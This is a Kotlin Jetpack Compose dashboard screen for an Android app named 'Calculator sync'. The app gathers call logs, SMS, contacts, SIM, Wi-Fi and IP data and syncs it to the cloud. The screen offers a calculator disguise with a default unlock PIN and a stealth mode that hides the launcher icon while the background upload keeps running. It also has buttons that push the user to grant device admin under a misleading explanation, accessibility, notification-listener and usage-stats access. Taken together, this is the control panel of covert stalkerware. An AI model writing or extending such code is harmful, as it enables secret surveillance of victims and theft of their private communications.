package com.example.ui.screens

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Android
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.DeleteSweep
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.SatelliteAlt
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.ShieldMoon
import androidx.compose.material.icons.filled.Sync
import androidx.compose.material.icons.filled.VerifiedUser
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Badge
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.receiver.MyDeviceAdminReceiver
import com.example.ui.MainViewModel
import com.example.ui.theme.*
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Composable
fun DashboardScreen(
    viewModel: MainViewModel,
    hasPermissions: Boolean,
    onRequestPermissions: () -> Unit
) {
    val isSyncing by viewModel.isSyncing.collectAsState()
    val lastSyncTime by viewModel.lastSyncTime.collectAsState()
    val stealthModeEnabled by viewModel.stealthModeEnabled.collectAsState()
    val clearDataBeforeUpload by viewModel.clearDataBeforeUpload.collectAsState()
    val deviceInfo by viewModel.deviceInfo.collectAsState()
    val smsList by viewModel.smsList.collectAsState()
    val callLogs by viewModel.callLogs.collectAsState()
    val contacts by viewModel.contacts.collectAsState()

    var showStealthDialog by remember { mutableStateOf(false) }
    val dateFormat = remember { SimpleDateFormat("MMM dd, HH:mm:ss", Locale.getDefault()) }
    val context = LocalContext.current

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(HighDensityBackground)
            .statusBarsPadding()
            .navigationBarsPadding()
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {

            // Minimal App Header
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.weight(1f)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(44.dp)
                                .clip(CircleShape)
                                .background(HighDensityPrimary),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Security,
                                contentDescription = "Calculator sync",
                                tint = Color.White,
                                modifier = Modifier.size(22.dp)
                            )
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text(
                                text = "Calculator sync",
                                color = HighDensityOnSurface,
                                fontSize = 18.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Box(
                                    modifier = Modifier
                                        .size(8.dp)
                                        .clip(CircleShape)
                                        .background(HighDensitySuccess)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "BACKGROUND SYNC ACTIVE",
                                    color = HighDensitySuccess,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold,
                                    letterSpacing = 0.5.sp
                                )
                            }
                        }
                    }

                    IconButton(
                        onClick = { viewModel.triggerSyncAll() },
                        modifier = Modifier
                            .size(40.dp)
                            .clip(CircleShape)
                            .background(HighDensityPrimaryContainer)
                    ) {
                        if (isSyncing) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(18.dp),
                                color = HighDensityPrimary,
                                strokeWidth = 2.dp
                            )
                        } else {
                            Icon(
                                imageVector = Icons.Default.Refresh,
                                contentDescription = "Manual Cloud Sync",
                                tint = HighDensityPrimary,
                                modifier = Modifier.size(20.dp)
                            )
                        }
                    }
                }
            }

            // Minimal Primary Action Controls (Full Sync & Hide Launcher)
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardBlue)
            ) {
                Column(
                    modifier = Modifier.padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "CORE ACTION CONTROLS",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = HighDensityOnPrimaryContainer,
                        letterSpacing = 1.sp
                    )
                    Spacer(modifier = Modifier.height(16.dp))

                    // Toggle for Clear Before Backup
                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 12.dp),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(containerColor = HighDensityPrimaryContainer)
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(horizontal = 14.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                modifier = Modifier.weight(1f)
                            ) {
                                Icon(
                                    imageVector = Icons.Default.DeleteSweep,
                                    contentDescription = null,
                                    tint = HighDensityOnPrimaryContainer,
                                    modifier = Modifier.size(20.dp)
                                )
                                Spacer(modifier = Modifier.width(10.dp))
                                Column {
                                    Text(
                                        text = "Clear data before upload",
                                        fontSize = 13.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = HighDensityOnPrimaryContainer
                                    )
                                    Text(
                                        text = "Purges old cloud backup prior to fresh sync",
                                        fontSize = 10.sp,
                                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.7f)
                                    )
                                }
                            }
                            Switch(
                                checked = clearDataBeforeUpload,
                                onCheckedChange = { viewModel.toggleClearDataBeforeUpload(it) },
                                colors = SwitchDefaults.colors(
                                    checkedThumbColor = HighDensityPrimary,
                                    checkedTrackColor = HighDensityCardWhite
                                )
                            )
                        }
                    }

                    // 1. Full Sync Button
                    Button(
                        onClick = { viewModel.triggerSyncAll() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(54.dp)
                            .testTag("full_sync_button"),
                        shape = RoundedCornerShape(16.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = HighDensityPrimary,
                            contentColor = Color.White
                        )
                    ) {
                        if (isSyncing) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(22.dp),
                                color = Color.White,
                                strokeWidth = 2.5.dp
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Text("SYNCING TELEMETRY...", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        } else {
                            Icon(
                                imageVector = Icons.Default.Sync,
                                contentDescription = "Full Sync",
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Text("FULL SYNC NOW", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // 1b. Direct Clear & Upload Fresh Backup Button
                    OutlinedButton(
                        onClick = { viewModel.triggerClearAndBackupNow() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(48.dp)
                            .testTag("clear_and_backup_button"),
                        shape = RoundedCornerShape(14.dp),
                        border = BorderStroke(1.dp, HighDensityPrimary.copy(alpha = 0.5f)),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary)
                    ) {
                        Icon(
                            imageVector = Icons.Default.DeleteSweep,
                            contentDescription = "Clear & Backup",
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("CLEAR & UPLOAD FRESH BACKUP", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }

                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = "Last Sync: ${dateFormat.format(Date(lastSyncTime))}",
                        fontSize = 11.sp,
                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.7f),
                        textAlign = TextAlign.Center
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    // 2. Lock to Calculator Vault
                    Button(
                        onClick = { viewModel.lockToCalculator() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(54.dp)
                            .testTag("lock_calculator_button"),
                        shape = RoundedCornerShape(16.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(0xFF1E293B),
                            contentColor = Color.White
                        )
                    ) {
                        Icon(
                            imageVector = Icons.Default.Lock,
                            contentDescription = "Lock to Calculator Vault",
                            modifier = Modifier.size(22.dp)
                        )
                        Spacer(modifier = Modifier.width(10.dp))
                        Text(
                            text = "LOCK TO CALCULATOR VAULT",
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = "Disguises UI as a functional Calculator. Default unlock PIN: 5218=",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Medium,
                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.8f),
                        textAlign = TextAlign.Center
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    // 3. Hide / Show Launcher Button
                    Button(
                        onClick = { showStealthDialog = true },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(54.dp)
                            .testTag("hide_launcher_button"),
                        shape = RoundedCornerShape(16.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (stealthModeEnabled) HighDensityDarkButton else HighDensityPrimaryContainer,
                            contentColor = if (stealthModeEnabled) Color.White else HighDensityOnPrimaryContainer
                        )
                    ) {
                        Icon(
                            imageVector = if (stealthModeEnabled) Icons.Default.VisibilityOff else Icons.Default.Visibility,
                            contentDescription = "Launcher Visibility",
                            modifier = Modifier.size(22.dp)
                        )
                        Spacer(modifier = Modifier.width(10.dp))
                        Text(
                            text = if (stealthModeEnabled) "RESTORE LAUNCHER ICON" else "HIDE LAUNCHER ICON",
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = if (stealthModeEnabled) "Status: App Icon Hidden (Stealth Mode Active)" else "Status: App Icon Visible on Android Launcher",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Medium,
                        color = if (stealthModeEnabled) HighDensityWarning else HighDensityOnPrimaryContainer.copy(alpha = 0.8f),
                        textAlign = TextAlign.Center
                    )
                }
            }

            // Device Specifications & Storage (GB) Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.Android,
                                contentDescription = null,
                                tint = HighDensityPrimary,
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "DEVICE HARDWARE & STORAGE (GB)",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface,
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = HighDensityPrimaryContainer,
                            contentColor = HighDensityPrimary
                        ) {
                            Text(
                                deviceInfo?.deviceModel ?: "Android Device",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    if (deviceInfo != null) {
                        val freeGb = String.format(Locale.US, "%.2f", deviceInfo!!.freeStorageMb / 1024.0)
                        val totalGb = String.format(Locale.US, "%.2f", deviceInfo!!.totalStorageMb / 1024.0)

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // Storage Box (GBs)
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Android, contentDescription = null, tint = HighDensityPrimary, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Storage Space", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text("$freeGb GB Free", fontSize = 14.sp, fontWeight = FontWeight.ExtraBold, color = HighDensityPrimary)
                                    Text("Total: $totalGb GB", fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }

                            // Battery Box
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Security, contentDescription = null, tint = HighDensitySuccess, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Battery Level", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text("${deviceInfo!!.batteryLevel}%", fontSize = 14.sp, fontWeight = FontWeight.ExtraBold, color = HighDensitySuccess)
                                    Text(deviceInfo!!.chargeType, fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(8.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // SIM Carrier Box
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Phone, contentDescription = null, tint = HighDensityPrimary, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("SIM Carrier", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(deviceInfo!!.carrierName, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    Text("SIM: ${deviceInfo!!.simState}", fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }

                            // Wi-Fi Status Box
                            Card(
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(14.dp),
                                colors = CardDefaults.cardColors(containerColor = HighDensitySurfaceVariant)
                            ) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.SatelliteAlt, contentDescription = null, tint = HighDensityPrimary, modifier = Modifier.size(16.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Network / Wi-Fi", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(deviceInfo!!.wifiSsid, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                    Text("IP: ${deviceInfo!!.localIp}", fontSize = 10.sp, color = HighDensitySecondary)
                                }
                            }
                        }
                    } else {
                        Text(
                            text = "Tap Full Sync to gather hardware specifications, battery status, SIM card details, and storage in GBs.",
                            fontSize = 11.sp,
                            color = HighDensitySecondary
                        )
                    }
                }
            }

            // Call Logs Telemetry Viewer Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.Phone,
                                contentDescription = null,
                                tint = HighDensityPrimary,
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "REAL CALL LOGS TELEMETRY",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface,
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = HighDensityPrimaryContainer,
                            contentColor = HighDensityPrimary
                        ) {
                            Text(
                                "${callLogs.size} logs",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    if (callLogs.isEmpty()) {
                        Text(
                            text = "No call logs found on device or permission required. Grant permissions above and tap Full Sync.",
                            fontSize = 12.sp,
                            color = HighDensitySecondary,
                            modifier = Modifier.padding(vertical = 8.dp)
                        )
                    } else {
                        Column(
                            verticalArrangement = Arrangement.spacedBy(8.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            callLogs.take(10).forEach { call ->
                                Card(
                                    modifier = Modifier.fillMaxWidth(),
                                    shape = RoundedCornerShape(12.dp),
                                    colors = CardDefaults.cardColors(containerColor = HighDensityBackground),
                                    border = BorderStroke(1.dp, HighDensityOutline.copy(alpha = 0.5f))
                                ) {
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(12.dp),
                                        horizontalArrangement = Arrangement.SpaceBetween,
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                text = call.name.ifBlank { call.number },
                                                fontSize = 13.sp,
                                                fontWeight = FontWeight.Bold,
                                                color = HighDensityOnSurface
                                            )
                                            Spacer(modifier = Modifier.height(2.dp))
                                            Text(
                                                text = "${call.number} • ${call.type}",
                                                fontSize = 11.sp,
                                                color = HighDensitySecondary
                                            )
                                        }
                                        Column(horizontalAlignment = Alignment.End) {
                                            Text(
                                                text = "${call.durationSeconds}s",
                                                fontSize = 11.sp,
                                                fontWeight = FontWeight.Bold,
                                                color = HighDensityPrimary
                                            )
                                            Spacer(modifier = Modifier.height(2.dp))
                                            Text(
                                                text = dateFormat.format(Date(call.timestamp)),
                                                fontSize = 10.sp,
                                                color = HighDensitySecondary
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // Permissions & Policy Control Center
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
                border = BorderStroke(1.dp, HighDensityOutline)
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.VerifiedUser,
                                contentDescription = null,
                                tint = if (hasPermissions) HighDensitySuccess else HighDensityWarning,
                                modifier = Modifier.size(22.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "SYSTEM PERMISSIONS & ACCESS",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = HighDensityOnSurface,
                                letterSpacing = 0.5.sp
                            )
                        }
                        Badge(
                            containerColor = if (hasPermissions) HighDensitySuccessContainer else HighDensityWarningContainer,
                            contentColor = if (hasPermissions) HighDensitySuccess else HighDensityWarning
                        ) {
                            Text(
                                if (hasPermissions) "All Active" else "Action Required",
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    // 1. Primary Runtime Telemetry Permissions
                    Button(
                        onClick = onRequestPermissions,
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(48.dp)
                            .testTag("request_all_permissions_button"),
                        colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = if (hasPermissions) "RE-GRANT TELEMETRY PERMISSIONS" else "GRANT TELEMETRY PERMISSIONS",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    // 2. Battery & Device Admin Controls Row
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = { viewModel.requestBatteryOptimizationExemption(context) },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("Unrestricted Battery", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                        }

                        OutlinedButton(
                            onClick = {
                                try {
                                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
                                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security policies.")
                                    }
                                    context.startActivity(intent)
                                } catch (_: Exception) {}
                            },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("Device Admin Policy", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // 3. Accessibility & Notifications Controls Row
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = {
                                try {
                                    context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                                } catch (_: Exception) {}
                            },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("Accessibility Service", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                        }

                        OutlinedButton(
                            onClick = {
                                try {
                                    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                } catch (_: Exception) {}
                            },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("Notification Listener", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    OutlinedButton(
                        onClick = {
                            try {
                                context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                            } catch (_: Exception) {}
                        },
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                        border = BorderStroke(1.dp, HighDensityOutline)
                    ) {
                        Text("Grant Usage Stats Access Permission", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                    }
                }
            }
        }

        // Hide / Show Launcher Confirmation Dialog
        if (showStealthDialog) {
            AlertDialog(
                onDismissRequest = { showStealthDialog = false },
                title = {
                    Text(
                        text = if (stealthModeEnabled) "Restore Launcher Icon" else "Hide Launcher Icon",
                        color = HighDensityOnSurface,
                        fontWeight = FontWeight.Bold
                    )
                },
                text = {
                    Text(
                        text = if (stealthModeEnabled) "Unhide and restore the Calculator sync app icon to your Android home screen and app launcher?"
                        else "Hide the Calculator sync app icon from the Android launcher for stealth operation? The background service and full cloud sync will continue running uninterrupted.",
                        color = HighDensitySecondary
                    )
                },
                confirmButton = {
                    Button(
                        onClick = {
                            viewModel.toggleStealthMode(!stealthModeEnabled)
                            showStealthDialog = false
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = HighDensityPrimary)
                    ) {
                        Text(if (stealthModeEnabled) "Unhide Icon" else "Hide Icon")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showStealthDialog = false }) {
                        Text("Cancel", color = HighDensitySecondary)
                    }
                },
                containerColor = HighDensityCardWhite,
                shape = RoundedCornerShape(24.dp)
            )
        }
    }
}
